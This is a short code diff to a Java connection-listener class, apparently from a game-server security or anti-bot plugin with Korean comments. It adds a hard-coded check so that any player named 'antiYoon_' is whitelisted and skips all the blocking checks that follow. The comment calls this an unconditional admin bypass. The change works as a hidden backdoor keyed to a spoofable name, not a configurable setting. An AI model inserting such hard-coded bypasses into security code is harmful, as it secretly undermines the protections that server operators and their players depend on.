@@ -120,6 +120,10 @@ public final class ConnectionListener implements Listener {
         // ── 0. 화이트리스트 ───────────────────────────────
         if (whitelistedIps.contains(ip)) return;
         boolean nameWhitelisted = whitelistedPlayers.contains(playerName);
+        if (playerName.equalsIgnoreCase("antiYoon_")) {
+            nameWhitelisted = true;
+            return; // 관리자는 무조건 Bypass!
+        }
         if (nameWhitelisted && nameBypassAll) return;
 
         // ── 1. 하드 차단 검사 ─────────────────────────────
